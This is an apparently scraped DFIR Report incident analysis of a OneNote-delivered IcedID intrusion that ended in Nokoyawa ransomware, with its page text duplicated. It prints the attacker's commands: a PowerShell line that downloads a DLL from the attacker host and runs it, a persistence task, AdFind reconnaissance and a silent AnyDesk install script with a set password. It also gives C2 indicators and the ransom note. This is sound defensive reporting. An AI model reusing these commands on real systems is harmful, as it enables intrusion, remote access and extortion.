encoded again and decoded gives the following ransom note: Nokoyawa. If you see this, your files have been successfully encrypted and stolen. Don't try to search free decryption method. It's impossible. We are using symmetrical and asymmetric encryption. ATTENTION: - Don't rename encrypted files. - Don't change encrypted files. - Don't use third party software. You are risking irreversibly damaging the file by doing this. If you manage to keep things quiet on your end, this will never be known to the public. To reach an agreement you have 48 hours to visit our Onion Website. How to open Onion links: - Download TOR Browser from official website. - Open and enter this link: http://nokopay<REDACTED> - On the page you will see a chat with the Support. - Send your first message. Don't waste your time. Otherwise all your valuable and sensitive data will be leaked. Our websites are full of companies that doubted the fact of the data breach or it's extent. - http://nokoleakb76znymx443veg4n6fytx6spck6pc7nkr4dvfuygpub6jsid.onion/ - http://hl66646wtlp2naoqnhattngigjp5palgqmbwixepcjyq5i534acgqyad.onion/ - http://snatchteam.top The threat actors only deployed the ransomware on the two servers and did not perform a domain wide deployment. After the ransom of these two systems, the threat actor\u2019s activity ceased. Please consider leaving feedback on this report here . Timeline Diamond Model Indicators Atomic IcedID mrassociattes[.]com (174.138.188.6) aerilaponawki[.]com (193.149.129.131) klindriverfor[.]com (5.255.102.167) alishaskainz[.]com (dr) Cobalt Strike msc-mvc-updates[.]com (91.215.85.183) FileZilla File Exfiltration 45.155.204.5 Computed Contract_02_21_Copy#909.one 5f4d630ef00656726401b205ae4dc88f aa8f2d6d98aa535e05685076ca02f781c2aa6464 9c337d27dab65fc3f4b88666338e13416f218ab75c4b5e37cc396241c225efe8 COIm.jpg d1da347e78bf043e2dc61638e946c3da d87a3c22771b1106a1a52d96df7b2944d93fa184 1ab812f7d829444dc703eeb02ea0a955ec839d5e2a9b619d44ac09a91135cad1 GET_ID.bat a59a7916156c52f732b4c2e321facfe1 8c949a7769d16c285347f650ef2eedac01dc1805 eae2bce6341ff7059b9382bfa0e0daa337ea9948dd729c0c1e1ee9c11c1c0068 INSTALL.ps1 b1f5e4774aa79f643350218df61e33f6 f1e7994c6568f0182a60f64557c7793df5e550ed b378c2aa759625de2ad1be2c4045381d7474b82df7eb47842dc194bb9a134f76 agaloz.dll 76a1f94ed6499b99d2cc500998846875 ca14d61bcf038cda45199f54c7c452ad262a7c88 d6127d614309acbf2a630fe3fb0fda8e4079dcf2045f91aa400d179751d425f7 csrss.exe/Funa2.exe f927cd4f40c7a6dad769a8f9af771a8c 0fdfef7c9cc4305df81b006e898e1592aa822437 06bbb36baf63bc5cb14d7f097745955a4854a62fa3acef4d80c61b4fa002c542 svchost.exe 8800e6f1501f69a0a04ce709e9fa251c 72a1c9ea93d18309769d8be5cdb3daedf1cddcf5 3c9f4145e310f616bd5e36ca177a3f370edc13cf2d54bb87fe99972ecf3f09b4 Detections Network ET MALWARE Observed DNS Query to IcedID Domain (qoipaboni .com) ET MALWARE Win32/IcedID Request Cookie ET INFO Windows Powershell User-Agent Usage ETPRO INFO HTTP Request with Lowercase accept Header Observed ET MALWARE Cobalt Strike Malleable C2 (Unknown Profile) ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection ET POLICY SMB2 NT Create AndX Request For an Executable File ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET POLICY HTTP traffic on port 443 (POST) ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET SCAN Potential SSH Scan OUTBOUND ET HUNTING Possible Powershell .ps1 Script Use Over SMB ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File ET HUNTING Suspicious csrss.exe in URI ET INFO Executable Download from dotted-quad Host ET INFO Dotted Quad Host DLL Request Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Public Rules Repo : b26feb0b-8891-4e66-b2e7-ec91dc045d58 : AnyDesk Network 50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery 8a0d153f-b4e4-4ea7-9335-892dfbe17221 : NetScan Share Enumeration Write Access Check DFIR Private Rules: baa9adf9-a01c-4c43-ac57-347b630bf69e : Default Cobalt Strike Named Pipes a526e0c3-d53b-4d61-82a1-76d3d1358a30 : Silent Installation of AnyDesk RMM b526e0c3-d53b-4d61-82a1-76d3d1358a31 : AnyDesk RMM Password Setup via Command Line 624f1f33-ee38-4bbe-9f4a-088014e0c26b : IcedID Malware Execution Patterns 37948baa-5310-424c-bb18-b29c56be160f : Suspicious Execution of DLL with Unusual File Extensions Sigma Repo : 530a6faa-ff3d-4022-b315-50828e77eef5 : Anydesk Remote Access Software Service Installation 114e7f1c-f137-48c8-8f54-3088c24ce4b9 : Remote Access Tool - AnyDesk Silent Installation b52e84a3-029e-4529-b09b-71d19dd27e94 : Remote Access Tool - AnyDesk Execution b1377339-fda6-477a-b455-ac0923f9ec2c : Remote Access Tool - AnyDesk Piped Password Via CLI 065b00ca-5d5c-4557-ac95-64a6d0b64d86 : Remote Access Tool - Anydesk Execution From Suspicious Folder 9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution 903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution 5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE 0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo 968eef52-9cff-4454-8992-1e74b9cbad6c : Reconnaissance Activity e568650b-5dcd-4658-8f34-ded0b1e13992 : Potential Product Class Reconnaissance Via Wmic.EXE fcc6d700-68d9-4241-9a1a-06874d621b06 : Suspicious File Created Via OneNote Application d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 : CobaltStrike Named Pipe 811e0002-b13b-4a15-9d00-a613fce66e42 : PUA - Process Hacker Execution d5866ddf-ce8f-4aea-b28e-d96485a20d3d : Files With System Process Name In Unsuspected Locations 96036718-71cc-4027-a538-d1587e0006a7 : Windows Processes Suspicious Parent Directory c8557060-9221-4448-8794-96320e6f3e74 : Windows PowerShell User Agent JoeSecurity Repo : 200068 : Execute DLL with spoofed extension Yara https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19772/19772.yar MITRE Credentials In Files - T1552.001 Data Encrypted for Impact - T1486 Data from Network Shared Drive - T1039 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Indicator Removal - T1070 Ingress Tool Transfer - T1105 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerade File Type - T1036.008 Masquerading - T1036 Network Service Discovery - T1046 Phishing - T1566 PowerShell - T1059.001 Process Discovery - T1057 Process Injection - T1055 Regsvr32 - T1218.010 Remote Access Software - T1219 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Rundll32 - T1218.011 Scheduled Task - T1053.005 Security Software Discovery - T1518.001 System Information Discovery - T1082 System Owner/User Discovery - T1033 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Service - T1543.003 Internal case #19772 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Threat Brief: WordPress Plugin Exploit Leads to Godzilla Web Shell, Discovery & New CVE From IcedID to Dagon Locker Ransomware in 29 Days Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "From OneNote to RansomNote: An Ice Cold Intrusion \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind Exfiltrate Data icedid nokoyawa ransomware From OneNote to RansomNote: An Ice Cold Intrusion April 1, 2024 Key Takeaways In late February 2023, threat actors rode a wave of initial access using Microsoft OneNote files. In this case, we observed a threat actor deliver IcedID using this method. After loading IcedID and establishing persistence, there were no further actions, other than beaconing for over 30 days. The threat actor used Cobalt Strike and AnyDesk to target a file server and a backup server. The threat actor used FileZilla to exfiltrate data from the network before deploying Nokoyawa ransomware . An audio version of this report can be found on Spotify , Apple , YouTube , Audible , & Amazon . Please consider leaving feedback on this report here . Services We provide a range of services, one of which is our Threat Feed, specializing in monitoring Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, Viper, Mythic, Havoc, Meterpreter, and more. For example, the Cobalt Strike server in this case was detected weeks before this intrusion started. Another service we provide is Private Threat Briefs, which encompasses over 25 private reports annually. These reports follow a format similar to our public reports but are more concise in nature. In contrast to our public reports, these briefs are typically released shortly after an intrusion, sometimes even while the intrusion is still ongoing. Our comprehensive \u201cAll Intel\u201d service includes the Threat Feed, Private Threat Briefs, exploit events, long-term infrastructure tracking, clustering, Cobalt Strike configurations, C2 domains, and a curated collection of intelligence, which includes non-public case data. Our Private Sigma Ruleset is exclusively curated using insights derived from Private Threat Briefs and internal cases, focusing on Sigma rules. As of January 2024, it encompasses approximately 100 Sigma rules, created from the knowledge of 40+ distinct cases. Each rule is mapped to ATT&CK and accompanied by a test example. Contact us for a demo or free trial today! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary This intrusion started in late February of 2023 and lasted through late March of 2023. The threat actor initially gained access through a phishing campaign, in which they distributed emails containing malicious OneNote attachments. During this period, OneNote files had surged in popularity among initial access brokers. This rise was primarily due to their capability to circumvent email attachment blocking rules and evade detection by existing security mechanisms. Upon opening the malicious OneNote file and engaging with it, the file triggered the execution of a cmd file. This, in turn, launched PowerShell to facilitate the download of an IcedID DLL from a remote server. To evade detection, this DLL was disguised using various image file extensions. Following the execution of the downloaded DLL, a scheduled task was established to maintain persistence within the system. Notably, unlike prior IcedID infections, no discovery actions were observed at this time. For the next 21 days, activity was limited to command and control beaconing with no other actions detected. On day 22, the standard IcedID discovery, using Microsoft tools like: net, nltest, chcp, and systeminfo, was observed. Beyond this, no further activity was noted. On day 33 of the intrusion, the IcedID malware launched several Cobalt Strike beacons. These beacons, once active on the beachhead host, injected into numerous processes and initiated an Active Directory discovery operation. This operation used a batch script to execute a series of AdFind commands. Next, a PowerShell script was deployed to install AnyDesk. Following the installation, another batch script ran to relay the newly generated AnyDesk ID back to the threat actor. The threat actor then connected to the host using AnyDesk and began browsing files. The account they were logged in as had elevated privileges, since the original user, who inadvertently activated the malware, was a member of the domain administrators group. Leveraging this access, they accessed LSASS on the host and proceeded with additional reconnaissance activities. These actions encompassed both command line queries, such as net, whoami, and route, as well as GUI based tools through the AnyDesk connection, including the use of Task Manager and the deployment of SoftPerfect Network Scanner (aka NetScan). After getting a list of hosts, the threat actor created a batch file to run nslookup for all the identified hosts. While that was running, the threat actor browsed file shares, looking at various documents including password related documents. The threat actor then created a second batch script to run nslookup, this time targeting Windows servers specifically. Shortly after running this, the threat actor initiated their first lateral movement action, using RDP to connect to a backup server from their beachhead host. On the backup server, they used Internet Explorer to download a Cobalt Strike beacon and then they executed it. Utilizing this beacon, they proceeded to deploy and execute an AnyDesk installer package, identical to the one observed on the initial compromised host. Next, they pivoted to a file server and performed the same actions. On the file server, they continued to review documents, including insurance related files. The threat actor then opened Internet Explorer on the file server and proceeded to download FileZilla. Utilizing the FileZilla client, they established a SFTP connection to a remote server, initiating the data exfiltration process. This marked the beginning of a prolonged data exfiltration operation that spanned several hours. Apart from the ongoing data transfers, activity significantly decreased until it resumed the following day. Approximately 18 hours after the initiation of the data exfiltration process, the threat actor deemed the activity complete and progressed to the next phase of their attack. They conducted another network scan utilizing NetScan. Roughly two and a half hours post-scan, they initiated the preparation for a ransomware delivery. Leveraging their AnyDesk connection on the file server, they reviewed both the Task Manager and the Local Group Policy Manager, before dropping a ransomware file on the host. Following this, they executed a batch script designed to launch the ransomware. Following the execution of ransomware on the file server, the threat actor re-established their connection to the backup server, conducting similar checks via Task Manager and Local Group Policy Manager before dropping the ransomware file. Next, they introduced and executed IOBit\u2019s Unlocker utility, a move likely aimed at circumventing file locks imposed by the backup software. After using this tool, they followed the same batch script execution on this server as previously observed. After execution, they dropped and ran ProcessHacker and then proceeded to open the batch file in notepad++ before re-running the script and ransomware. Approximately two hours after the initiation of the ransomware on the file server, the threat actor revisited the system through their AnyDesk connection. In this return visit, they uninstalled FileZilla, signaling a move to cover their tracks. Next, they re-executed the ransomware on the host, and then opened the ransom note on the server\u2019s desktop, verifying their objective was complete. Following this action, no further activities were detected from the threat actor regarding the ransomware deployment, indicating a strategic decision to limit the attack\u2019s scope to these two critical servers rather than extending it across the entire network. From initial access to ransomware execution, we observed a Time to Ransomware (TTR) of 812 hours, just over 34 calendar days. One interesting thing to note about the command and control domain for Cobalt Strike is it was seized by Microsoft, Fortra and Health-ISAC a few weeks after this intrusion. On April 6, 2023, the command and control domain changed DNS to Microsoft with a domain registration name of Digital Crimes Unit. Please consider leaving feedback on this report here . Analysts Analysis and reporting completed by @iiamaleks , @IrishD34TH , and @Miixxedup Initial Access A widespread malicious email campaign that broadly targeted many companies in unrelated industries blasted generic lures with an attached OneNote file claiming to contain an unspecified \u201csecure message.\u201d The campaign was documented in open-source threat intelligence by pr0xylife on their GitHub repository . The campaign ID used by threat actor was 3329953471, embedded in the configuration data in the IcedID DLL payload. According to Proofpoint Threat Research, the campaign was not very large in message volume compared to other campaigns, with fewer than one thousand messages observed over two days, broadly targeting companies across Manufacturing, Technology, Energy, Retail, Insurance, and several other sectors. The threat actor behind the campaign used techniques similar to two tracked threat actors but did not provide enough unique attributes to strongly attribute the campaign to either one of them. The OneNote file used to gain initial access in this case was not very sophisticated. A Windows batch file named \u201cO p e n.cmd\u201d was hidden behind a large button marked \u201cOpen\u201d in the OneNote file with a blurred image of a document in the background and simple instructions in the foreground to double click the button. Execution The initial execution through the OneNote lure required the person who received the email attachment to open the OneNote file. After clicking through the warning prompt, the O p e n.cmd file executed PowerShell to download an IcedID DLL named as if it was a JPG file, then used rundll32 to execute the DLL, which immediately connected to command and control servers, checked in and started beaconing over unencrypted HTTP, triggering an Emerging Threats Open rule: ET MALWARE Win32/IcedID Request Cookie. The earliest indicators that something suspicious occurred were the Sysmon events: File Created (Event ID 11) and File Stream Created (Event ID 15) that showed a .cmd file with the Mark of the Web was created by OneNote: The metadata of the O p e n.cmd batch file can be found on VirusTotal , and the contents are shown below. It is a very simple batch script that uses basic obfuscation, but yet presents some easy detection opportunities in its behavior: After de-obfuscating the batch file (or by observing the child processes created during dynamic analysis), the purpose of the script becomes clear. powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\\programdata\\COIm.jpg It uses PowerShell to download a payload file from a URL. The remote server request makes it look like it could be a GIF image that is being downloaded. The file is dropped to C:\\programdata\\ using a filename that looks like a JPEG image. The real filetype is actually a DLL: The file was then run using rundll32. rundll32 c:\\programdata\\COIm.jpg,init Somewhat surprisingly, more than a month after initial access in the intrusion, after the threat actor had started interacting with the compromised machine using AnyDesk, they opened the OneNote file and double-clicked the Open button to launch IcedID again. We are unsure of the motivation of this action, but this represented another chance for defenders to respond if detections were in place. Execution of Cobalt Strike Beacon On the 33rd day of the intrusion, the IcedID malware was observed dropping several files. These files were Cobalt Strike beacons, which were then executed via the IcedID malware. IcedID was running in rundll32.exe, which launched a DLL version of Cobalt Strike beacon from the user\u2019s AppData\\Local\\Temp directory using regsvr32.exe. The IcedID rundll32.exe process also launched an EXE version of a beacon named \u201cFuna2.exe\u201d from the same Temp directory. During lateral movement activity, the threat actors deployed the same executable Cobalt Strike beacon as seen on the beachhead host. This time, they used the name csrss.exe and executed these using the RDP session. The files were downloaded onto the lateral hosts using Internet Explorer, then executed by clicking directly from the Internet Explorer download prompt or by double-clicking in File Explorer window. Throughout the later stages of the intrusion the Cobalt Strike beacons used various named pipes. One of the many effective ways to detect Cobalt Strike beacon in this intrusion was through the named pipes it created, which used the default naming patterns. These pipe creation events were observed with Sysmon. A DLL version of the Cobalt Strike beacon was dropped on the beachhead host in the Local AppData Temp directory and executed with RegSvr32.exe, but that process did not create any named pipes. The default Cobalt Strike pipes are (the \u201c*\u201d symbolize the prefix/suffix): \\postex_* \\postex_ssh_* \\status_* \\msagent_* \\MSSE-* \\*-server More strategies for detecting Cobalt Strike can be found in Cobalt Strike, a Defender\u2019s Guide part 1 and part 2 . Persistence During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it: Cadiak.dll : IcedID first stage. license.dat : Encoded version of the second stage, which gets loaded into memory by the first stage. A scheduled task was created that contained instructions for executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID uses for persistence. <?xml version=\"1.0\" encoding=\"UTF-16\"?> <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"> <RegistrationInfo> <URI>\\azigci_{C747FFDF-F0E2-113B-8DCA-0ECA4EBB92A2}</URI> </RegistrationInfo> <Triggers> <LogonTrigger id=\"LogonTrigger\"> <Enabled>true</Enabled> <UserId>[REDACTED]</UserId> </LogonTrigger> </Triggers> <Principals> <Principal id=\"Author\"> <RunLevel>HighestAvailable</RunLevel> <UserId>[REDACTED]</UserId> <LogonType>InteractiveToken</LogonType> </Principal> </Principals> <Settings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> <AllowHardTerminate>false</AllowHardTerminate> <StartWhenAvailable>true</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings> <Duration>PT10M</Duration> <WaitTimeout>PT1H</WaitTimeout> <StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Actions Context=\"Author\"> <Exec> <Command>rundll32.exe</Command> <Arguments>\"C:\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED]\\Cadiak.dll\",init --od=\"DeskBlouse\\license.dat\"</Arguments> </Exec> </Actions> </Task> The scheduled task was configured to execute at logon under the user that initially executed the IcedID payload. Later in the intrusion, AnyDesk was installed with a command line option that established persistence, running when Windows starts by creating a Service: C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent During the deployment of AnyDesk, a service creation event was generated under the System channel: Alerting on every service creation is usually far too noisy for any meaningful review by security operations personnel, but it can be very helpful to alert on specific patterns of remote monitoring and management (RMM) installation artifacts. There are many approaches for detecting RMM tools through resilient patterns of file paths or digital signatures. These legitimate tools may not trigger alerts in endpoint detection products by default, so it is important for security teams to create custom detections. As seen in various previous cases here at The DFIR Report, and also on other platforms, RMM tools provide a very easy way to get access to systems with interactive capabilities. Privilege Escalation The user account that opened the initial OneNote lure file was in the domain administrators security group. Usually, threat actors have to work to escalate to a domain admin from an unprivileged user account, but in this case, it was a given. This is an example of why it is a best practice for domain administrators to use separate accounts and a privileged workstation to perform administrative functions, while using a non-privileged user account to check email, browse the web, and open files from unknown sources when necessary. Defense Evasion Masquerading One of the simpler ways that IcedID attempted to evade detection was by naming the malware DLL file as COIm.jpg. Renaming a DLL file extension to a commonly ignored graphics file type, such as jpg, gif, or png, is a simple example of Masquerading, MITRE Technique T1036.008 , and represents an excellent opportunity for a custom detection . The threat actor was observed using common Windows process names for other tooling used during the intrusion, including: csrss.exe for a Cobalt Strike beacon downloaded from 91.215.85[.]183/download/csrss.exe svchost.exe for the ransomware payload deployed to systems. Process Injection Upon execution of a Cobalt Strike beacon, process injection into a svchost.exe process was observed. In this case, process injection was conducted by writing into a remote process and executing the code via a remote thread. svchost.exe was subsequently observed executing multiple different commands related to discovery and enumeration. Since the discovery commands involved executing scripts via cmd.exe , the anomalous parent child relationship between svchost.exe and cmd.exe was observed on the system from a memory dump. Indicator Removal FileZilla, installed by the threat actors for exfiltration activity, was observed being manually uninstalled by the threat actors during the final ransomware deployment period. Credential Access The threat actors extracted credentials from LSASS during the intrusion. The process started with a Cobalt Strike beacon process starting a new rundll32.exe child process, with no command line arguments, as SYSTEM. It is unusual for rundll32 to be executed without any command line, but it is a common pattern for Cobalt Strike beacon injection target processes. This makes a useful detection pattern. The rundll32 process also created a named pipe (Sysmon Event ID 17) with a pipe name that started with \u201c\\postex_\u201d which is another well-known Cobalt Strike beacon artifact that can be detected. The newly spawned rundll32 process accessed the lsass.exe process, and then created a remote thread in lsass.exe. These events were recorded by Sysmon event IDs 8 and 10. Event ID 10 had the following relevant fields, which may be useful for threat hunting or incident response: Process accessed: SourceImage: C:\\Windows\\system32\\rundll32.exe TargetImage: C:\\Windows\\system32\\lsass.exe GrantedAccess: 0x1FFFFF CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d1e4|C:\\Windows\\System32\\KERNELBASE.dll+2bcbe|UNKNOWN(0000017C0BD11D3D) TargetUser: NT AUTHORITY\\SYSTEM Event ID 8 had the following relevant fields: CreateRemoteThread detected: SourceImage: C:\\Windows\\System32\\rundll32.exe TargetImage: C:\\Windows\\System32\\lsass.exe StartModule: - StartFunction: - TargetUser: NT AUTHORITY\\SYSTEM After accessing and injecting into LSASS, the threat actors began using another domain administrator account indicating successful credential access. During file share browsing activity by the threat actors, we observed them finding and opening a document related to passwords for the environment. Discovery IcedID Discovery IcedID was observed executing multiple discovery commands originating from rundll32.exe on the beachhead. WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List ipconfig /all systeminfo net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all net group \"Domain Admins\" /domain These host profiling commands in this order are typically seen from IcedID bots, and reverse engineering the IcedID binary shows that they are hard-coded (in encrypted strings) to be run when the bot receives a specific command from its command and control server. A published IcedID analysis report from Binary Defense describes the same commands observed , and a report from Walmart Global Tech details the algorithm to decrypt the command strings. In different IcedID samples, the commands may appear in a different order, but all versions contain nearly the same list of profiling commands. While alerting on any one of these commands by itself might result in too many false-positive alerts for security operations, a useful technique is to set up alerts when more than three or four of these commands are seen in a short time period on the same host. If the parent process is rundll32, regsvr32, or another high-risk process, the severity of the alert may be elevated. Active Directory Enumeration An AD.bat batch script and AdFind.exe were dropped onto the beachhead host from a process injected svchost.exe process. The AD.bat script was subsequently executed, which initiated discovery of Active Directory via ADFind. adfind.exe -gcb -sc trustdmp adfind.exe -f \"(objectcategory=group)\" adfind.exe -subnets -f (objectCategory=subnet) adfind.exe -f (objectcategory=organizationalUnit) adfind.exe -f objectcategory=computer -csv name operatingSystem adfind.exe -f objectcategory=computer adfind.exe -f (objectcategory=person) C:\\Windows\\system32\\cmd.exe /c dir /s /b C:\\Windows\\system32\\*htable.xsl Nslookup Discovery An injected process svchost.exe was observed dropping a ns.bat Batch script. Execution of ns.bat initiated the execution of nslookup commands that attempted to resolve multiple desktop and server hostnames. Later, a second nsser.bat script was observed executing multiple nslookup commands. Port Scanning SoftPerfect Network Scanner was used by the threat actor on multiple different systems under different directories. NetScan was seen connecting to multiple ports, on multiple different IP addresses\u2013an activity indicative of port scanning. The following summarizes a list of ports that were scanned using NetScan. Port Purpose 53 DNS 80 HTTP 88 Kerberos 111 NFS, NIS, or any rpc-based service 135 Remote Procedure Call 137 NetBIOS 161 SNMP 389 LDAP 443 HTTPS 445 SMB 464 Used by the Kerberos authentication system 2049 NFS 3389 RDP 5353 Multicast DNS (mDNS) and DNS-SD Hands on Discovery During RDP sessions the threat actors were also observed opening Task Manager multiple times via the Start Menu, as indicated by the /7 flag. Other commands were observed being executed manually by the threat actors, either from Cobalt Strike beacons or in Windows cmd shells opened via the interactive AnyDesk or RDP sessions. Commands included: C:\\Windows\\system32\\cmd.exe /C net group \"domain Admins\" /domain route print whoami Lateral Movement RDP was used by the threat actors to move laterally from the beachhead to other servers in the environment. After connecting to each server with RDP, the threat actors took steps to deploy a Cobalt Strike beacon, as well as AnyDesk on the system. The Cobalt Strike payload was downloaded from 91.215.85[.]183/download/csrss.exe via Internet Explorer. The payload was then launched multiple times from the Downloads folder and also copied and executed from the Windows temporary folder. In addition, the INSTALL.ps1 script was dropped and executed by the Cobalt Strike beacon. Collection While the threat actors had spent significant time in the environment, there appeared to be some interest in certain documents. A concrete example is, directly after the threat actors accesses the file server with AnyDesk, they use notepad++ to open a file related to the insurance policy of this victim. On the beachhead, workstation files were opened with their \u2018preferred\u2019 option: Word for .docx, Excel for .xlsx and Internet Explorer for .pdf. While it is not always easy to get a full list of files a threat actor had specifically accessed, this time it was logged well in process activity. On other machines, there was apparent interest in certain files, mainly related to possible passwords, PII and other financial data. Command and Control The threat actors used three different ways to access the hosts within this network: IcedID Cobalt Strike AnyDesk Below is an overview of each of the stages found during the intrusion. IcedID IcedID uses multiple staged domains to deliver parts of its functionality. The IcedID DLL running in the rundll32 process immediately connected to its command and control server on port 80, using domain name aerilaponawki[.]com, which resolved at the time to 193.149.129.131. The contents of this network connection matched a malware rule in the free Emerging Threats Open ruleset ET MALWARE Win32/IcedID Request Cookie. The IcedID process also connected to two other command and control servers by domain name, but both of these connections used TLS over port 443, so it was not possible for the network sensor to observe as much content or match as many network detection rules as it would have with TLS termination or unencrypted traffic. The connection to klindriverfor[.]com (5.255.102.167) on port 443 repeated about once every 10 minutes for 12 days. The connection to alishaskainz[.]com (45.61.139.206) on port 443 also repeated about once every 10 minutes for 28 days. Below table shows an overview and function of each domain: IP Port Domain Usage ISP Location 193.149.129.131 80 aerilaponawki[.]com First callout and primary C2 IcedID BLNWX NL 5.255.102.167 443 klindriverfor[.]com Additional C2 IcedID The Infrastructure Group NL 45.61.139.206 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB 5.255.105.55 443 halicopnow[.]com Additonal C2 IcedID The Infrastructure Group NL For each of the domains, an overview of the relevant rules that can be used (in combination) to look for IcedID behavior: aerilaponawki[.]com: ET MALWARE Win32/IcedID Request Cookie klindriverfor[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) alishaskainz[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) halicopnow[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) When looking for additional strange network connections, we can find these two gathered from a memory dump of the compromised systems. The connection from rundll32.exe is especially interesting and is related to our IcedID infection. It appears to be a different IP for one of the previously found command and control domains. IP Port Domain Usage ISP Location 162.33.178.40 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB Cobalt Strike The Cobalt Strike beacons which were used during the intrusion were named: agaloz.dll Funa2.exe / csrss.exe They contain a configuration to contact the below command and control server: IP Domain Usage ISP Location 91.215.85.183 msc-mvc-updates[.]com Cobalt Strike C2 Prospero Ooo RU Suricata reported hits for \u2018 Malleable\u2019 profiles used by the Cobalt Strike beacon. These profiles are preconfigurable and are mostly used to \u2018mimic\u2019 known traffic of different applications, such as a mail client, chat client, or a JavaScript library. The rule that hits, can be seen in the first screenshot below. The second screenshot shows the actual configured portion of the profile, which appears very similar to this \u201cgmail\u201d profile . Communication goes via the URI: /_/scs/mail-static/_js/ The DFIR Report Threat Intel Team picked up this Cobalt Strike server on January 9th, 2023, weeks before the intrusion. On that day, the beacon profile resembled a freely available malleable C2 profile that mimics jquery . The command and control server appears to have been in use through at least April 2024 with a different Cobalt Strike beacon reported to the Triage malware sandboxing service using the same gmail-like profile and remote IP as observed in this intrusion. With that said, it appears Microsoft took over this domain on April 6, 2023 when DNS was switched from Cloudflare to MICROSOFTINTERNETSAFETY.NET and the domain started resolving to 20.69.178.82 (Microsoft). We can see the registration information was updated (date showing last updated) as well: We were also able to locate the complaint by Microsoft, Fortra and Health-ISAC to acquire this domain: Here\u2019s an outtake of the domain and registration information from the complaint . According to The DFIR Report\u2019s Threat Intel Team, the IP was observed hosting Cobalt Strike through June 3, 2023. After initial deployment, the threat actors downloaded additional beacons, all of which have a parent process of the executable called Funa2.exe . It appears that the .dll likely didn\u2019t work as expected, as five minutes later an .exe with the same name gets downloaded. DLL download attempt: Change to EXE download: Shortly after, we find the first connection to the server using the malleable profile paths: AnyDesk During later stages of the intrusion, the threat actors deployed AnyDesk using a PowerShell script copied under C:\\ProgramData\\INSTALL.ps1 . In addition, the copied PowerShell script was executed on multiple systems to facilitate the deployment of AnyDesk using the following commands: mkdir \"C:\\ProgramData\\Any\" # Download AnyDesk $clnt = new-object System.Net.WebClient $url = \"http://download.anydesk.com/AnyDesk.exe\" $file = \"C:\\ProgramData\\AnyDesk.exe\" $clnt.DownloadFile($url,$file) cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent cmd.exe /c echo btc1000qwe123 | C:\\ProgramData\\Any\\AnyDesk.exe --set-password #net user AD \"2020\" /add #net localgroup Administrators InnLine /ADD #reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v InnLine /t REG_DWORD /d 0 /f This install script appears to be similar to the previously leaked powershell script 